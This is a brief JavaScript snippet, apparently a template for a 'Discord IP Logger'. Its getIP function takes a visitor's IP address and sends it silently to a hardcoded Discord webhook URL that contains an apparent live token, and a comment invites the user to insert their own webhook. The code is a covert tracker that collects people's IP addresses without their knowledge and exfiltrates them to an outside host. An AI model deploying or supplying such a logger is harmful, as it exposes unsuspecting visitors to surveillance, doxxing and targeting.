function getIP(json) {
  var request = new XMLHttpRequest();
        const Hook = "https://discord.com/api/webhooks/982760224236662806/86INbGdKMaWEw_95AEN5OO2xBZ7_ptEPcccUD5aaujT_EQWSqumc5mwo_n40ro2A4toi"; // PUT UR WEBHOOK HERE
        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Discord IP Logger",
            embeds: [
                { "color": 7506394,
                "title": "IP Logged",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));
    }
